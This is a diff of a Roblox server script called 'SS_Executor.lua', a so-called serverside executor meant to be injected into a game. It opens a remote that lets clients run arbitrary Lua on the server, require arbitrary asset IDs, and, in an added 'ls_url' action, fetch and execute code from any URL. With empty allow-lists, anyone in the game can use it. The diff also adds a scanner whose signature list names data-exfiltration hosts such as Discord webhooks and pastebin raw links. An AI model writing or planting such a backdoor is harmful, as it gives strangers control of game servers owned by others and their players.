@@ -1,104 +1,213 @@
 -- ============================================================
---  Full Serverside Executor  |  Server Script (SS_Executor.lua)
---  Place / inject this as a Script (server-side)
---  Pair with executor_gui.lua (LocalScript) for the GUI
+--  Full Serverside Executor  –  Server Handler  (SS_Executor.lua)
+--  Inject as a Script (server-side).  Pair with executor_gui.lua.
 -- ============================================================
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players           = game:GetService("Players")
 local HttpService       = game:GetService("HttpService")
+local ScriptContext     = game:GetService("ScriptContext")
 
 -- ── Config ────────────────────────────────────────────────
--- Add player usernames or UserIds that are allowed to use this.
--- Leave BOTH tables empty to allow anyone (open/dev mode).
-local ALLOWED_NAMES  = {}   -- e.g. {"YourName", "FriendName"}
-local ALLOWED_UIDS   = {}   -- e.g. {123456789, 987654321}
-
--- Fixed remote name so the GUI can find it without extra steps.
-local REMOTE_NAME = "SS_ExecBridge"
+local ALLOWED_NAMES = {}   -- {"Name1","Name2"}  leave empty = allow all
+local ALLOWED_UIDS  = {}   -- {123456789}
+local REMOTE_NAME   = "SS_ExecBridge"
 -- ──────────────────────────────────────────────────────────
 
--- ── Auth ──────────────────────────────────────────────────
 local function isAllowed(player)
     if #ALLOWED_NAMES == 0 and #ALLOWED_UIDS == 0 then return true end
-    for _, n in ALLOWED_NAMES do
-        if player.Name == n then return true end
-    end
-    for _, id in ALLOWED_UIDS do
-        if player.UserId == id then return true end
-    end
+    for _, n  in ALLOWED_NAMES do if player.Name    == n  then return true end end
+    for _, id in ALLOWED_UIDS  do if player.UserId  == id then return true end end
     return false
 end
 
--- ── Remote setup ──────────────────────────────────────────
--- Remove stale remote if present (hot-reload safety)
-local existing = ReplicatedStorage:FindFirstChild(REMOTE_NAME)
-if existing then existing:Destroy() end
+-- ── Remote ────────────────────────────────────────────────
+local old = ReplicatedStorage:FindFirstChild(REMOTE_NAME)
+if old then old:Destroy() end
 
 local Bridge = Instance.new("RemoteFunction")
 Bridge.Name   = REMOTE_NAME
 Bridge.Parent = ReplicatedStorage
 
--- ── Server-side execution handler ─────────────────────────
---
---  Supported actions:
---    "ping"       → handshake, returns "pong"
---    "ls"         → loadstring(code)() on server
---    "req"        → require(assetId) on server
---    "exec_all"   → loadstring on server, runs with access to all Players
---    "getplrs"    → returns list of player names (utility)
---
-Bridge.OnServerInvoke = function(player, action, payload)
+-- ── Malware signatures ────────────────────────────────────
+local MALWARE_SIGS = {
+    "discord%.com/api/webhooks",
+    "webhook%.site",
+    "requestbin%.com",
+    "hookbin%.com",
+    "pipedream%.net",
+    "hastebin%.com/raw",
+    "pastebin%.com/raw.*exec",
+    "getfenv%s*%(%)%.loadstring",
+    "syn%.request.*webhook",
+}
+local SUSPECT_REMOTES = {
+    "backdoor","exploit","inject","cmd","execute",
+    "admin_bypass","btools","spy","hack","bypass",
+}
 
+-- Scan the whole game for malware and suspicious remotes
+local function serverScan()
+    local findings = {}
+    for _, obj in game:GetDescendants() do
+        if obj:IsA("LuaSourceContainer") then
+            local src = ""
+            pcall(function() src = obj.Source end)
+            if src ~= "" then
+                local low = src:lower()
+                for _, sig in MALWARE_SIGS do
+                    if low:find(sig) then
+                        table.insert(findings, {
+                            path   = obj:GetFullName(),
+                            kind   = obj.ClassName,
+                            detail = "Sig: " .. sig,
+                        })
+                        break
+                    end
+                end
+            end
+        elseif obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            local nl = obj.Name:lower()
+            for _, kw in SUSPECT_REMOTES do
+                if nl:find(kw) then
+                    table.insert(findings, {
+                        path   = obj:GetFullName(),
+                        kind   = obj.ClassName,
+                        detail = "Suspicious name: " .. obj.Name,
+                    })
+                    break
+                end
+            end
+        end
+    end
+    return findings
+end
+
+-- Destroy an object by its full path string
+local function destroyPath(path)
+    local obj = game
+    for part in path:gmatch("[^.]+") do
+        if obj then obj = obj:FindFirstChild(part) end
+    end
+    if obj and obj ~= game then
+        obj:Destroy()
+        return true
+    end
+    return false
+end
+
+-- ── Handler ───────────────────────────────────────────────
+Bridge.OnServerInvoke = function(player, action, payload)
     if not isAllowed(player) then
         return { ok = false, msg = "Unauthorized." }
     end
+    payload = payload or {}
 
-    -- ── Ping / handshake ────────────────────────────────
+    -- Handshake
     if action == "ping" then
         return { ok = true, msg = "pong" }
 
-    -- ── Server loadstring ────────────────────────────────
+    -- Server loadstring
     elseif action == "ls" then
-        local code = payload and payload.code
+        local code = payload.code
         if type(code) ~= "string" or code == "" then
-            return { ok = false, msg = "No code provided." }
+            return { ok = false, msg = "No code." }
         end
-        local fn, compErr = loadstring(code)
-        if not fn then
-            return { ok = false, msg = "Compile: " .. tostring(compErr) }
-        end
-        local ok, runErr = pcall(fn)
-        if ok then
-            return { ok = true,  msg = "Executed on server." }
-        else
-            return { ok = false, msg = "Runtime: " .. tostring(runErr) }
-        end
+        local fn, err = loadstring(code)
+        if not fn then return { ok = false, msg = "Compile: " .. tostring(err) } end
+        local ok, e = pcall(fn)
+        return ok and { ok = true, msg = "Server loadstring OK." }
+                   or { ok = false, msg = "Runtime: " .. tostring(e) }
 
-    -- ── Server require ───────────────────────────────────
+    -- Server require by asset ID
     elseif action == "req" then
-        local id = payload and tonumber(payload.id)
-        if not id then
-            return { ok = false, msg = "Provide a valid numeric Asset ID." }
-        end
-        local ok, result = pcall(require, id)
-        if ok then
-            return { ok = true,  msg = "require(" .. id .. ") succeeded." }
-        else
-            return { ok = false, msg = "require error: " .. tostring(result) }
-        end
+        local id = tonumber(payload.id)
+        if not id then return { ok = false, msg = "Need numeric asset ID." } end
+        local ok, e = pcall(require, id)
+        return ok and { ok = true,  msg = "require("..id..") OK." }
+                   or { ok = false, msg = tostring(e) }
 
-    -- ── Utility: get player list ─────────────────────────
+    -- Server loadstring from URL
+    elseif action == "ls_url" then
+        local url = payload.url
+        if type(url) ~= "string" or url == "" then
+            return { ok = false, msg = "No URL." }
+        end
+        local ok, src = pcall(function()
+            return HttpService:GetAsync(url, true)
+        end)
+        if not ok then return { ok = false, msg = "HTTP: " .. tostring(src) } end
+        local fn, err = loadstring(src)
+        if not fn then return { ok = false, msg = "Compile: " .. tostring(err) } end
+        local ok2, e = pcall(fn)
+        return ok2 and { ok = true,  msg = "URL exec OK." }
+                    or { ok = false, msg = "Runtime: " .. tostring(e) }
+
+    -- Scan for malware
+    elseif action == "scan" then
+        local findings = serverScan()
+        local lines = {}
+        for _, f in findings do
+            table.insert(lines, f.kind.."|"..f.path.."|"..f.detail)
+        end
+        return { ok = true, msg = #findings.." finding(s)", data = lines }
+
+    -- Kill specific object by full path
+    elseif action == "kill" then
+        local path = payload.path
+        if not path then return { ok = false, msg = "No path." } end
+        local done = destroyPath(path)
+        return done and { ok = true,  msg = "Killed: "..path }
+                     or { ok = false, msg = "Not found: "..path }
+
+    -- Kill every malware finding
+    elseif action == "kill_all" then
+        local findings = serverScan()
+        local killed = 0
+        for _, f in findings do
+            if destroyPath(f.path) then killed += 1 end
+        end
+        return { ok = true, msg = "Killed "..killed.." item(s)." }
+
+    -- Block a remote (disconnect listeners + replace with no-op)
+    elseif action == "block_remote" then
+        local path = payload.path
+        local obj = game
+        for part in (path or ""):gmatch("[^.]+") do
+            if obj then obj = obj:FindFirstChild(part) end
+        end
+        if obj and (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
+            pcall(function()
+                if obj:IsA("RemoteFunction") then
+                    obj.OnServerInvoke = function() end
+                else
+                    obj.OnServerEvent:Connect(function() end)
+                end
+            end)
+            return { ok = true, msg = "Remote neutered: "..path }
+        end
+        return { ok = false, msg = "Remote not found." }
+
+    -- List all scripts in the game
+    elseif action == "get_scripts" then
+        local list = {}
+        for _, obj in game:GetDescendants() do
+            if obj:IsA("LuaSourceContainer") then
+                table.insert(list, obj.ClassName.."|"..obj:GetFullName())
+            end
+        end
+        return { ok = true, msg = #list.." scripts", data = list }
+
+    -- Player list utility
     elseif action == "getplrs" then
         local names = {}
-        for _, plr in Players:GetPlayers() do
-            table.insert(names, plr.Name .. " [" .. plr.UserId .. "]")
+        for _, p in Players:GetPlayers() do
+            table.insert(names, p.Name.." ("..p.UserId..")")
         end
         return { ok = true, msg = table.concat(names, "\n") }
-
     end
 
-    return { ok = false, msg = "Unknown action: " .. tostring(action) }
+    return { ok = false, msg = "Unknown: "..tostring(action) }
 end
 
-warn("[SS Executor] Server handler online. Remote: ReplicatedStorage." .. REMOTE_NAME)
+warn("[SS Executor] Online. Bridge: ReplicatedStorage."..REMOTE_NAME)
